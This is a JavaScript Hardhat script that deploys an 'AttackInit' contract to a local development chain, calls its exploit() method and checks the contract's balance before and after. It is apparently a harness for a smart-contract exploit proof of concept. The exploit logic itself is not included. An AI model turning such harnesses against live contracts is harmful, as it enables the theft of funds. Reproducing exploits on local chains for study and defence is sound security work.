
const hre = require("hardhat");
const Web3 = require('web3');
const ethers = require('ethers');

async function main() {

  await hre.run('compile');

  const myDummyAccount = "0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199";
  const _gas = 29000000;
  const _gasPrice = '30000000000000';
  const web3 = new Web3("http://127.0.0.1:8545/");

  console.log("Starting...");

  const jsonAttackInitFile = require('../artifacts/contracts/AttackInit.sol/AttackInit.json');
  const jsonAttackInitABI = jsonAttackInitFile.abi;

  var atkInit = new web3.eth.Contract(jsonAttackInitABI);
  atkInit.options.data = jsonAttackInitFile.bytecode;

  await atkInit.deploy({})
  .send({
      from: myDummyAccount, gas: _gas, gasPrice: _gasPrice
  }, function(error, transactionHash){ console.log(error, transactionHash); })
  .on('error', function(error){ console.log(error); })
  .then(function(newContractInstance){
      console.log("Atk Init Contract address: ", newContractInstance.options.address)
      atkInit.options.address = newContractInstance.options.address;
  });

  await atkInit.methods.checkBalance(atkInit.options.address).send({from: myDummyAccount, gas: _gas, gasPrice: _gasPrice}, function(error, transactionHash){
      console.log(error, transactionHash);
  });

  await atkInit.methods.exploit().send({from: myDummyAccount, gas: _gas, gasPrice: _gasPrice}, function(error, transactionHash){
      console.log(error, transactionHash);
  });

  await atkInit.methods.checkBalance(atkInit.options.address).send({from: myDummyAccount, gas: _gas, gasPrice: _gasPrice}, function(error, transactionHash){
      console.log(error, transactionHash);
  });

  console.log("Exitting...");
}

// main();

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
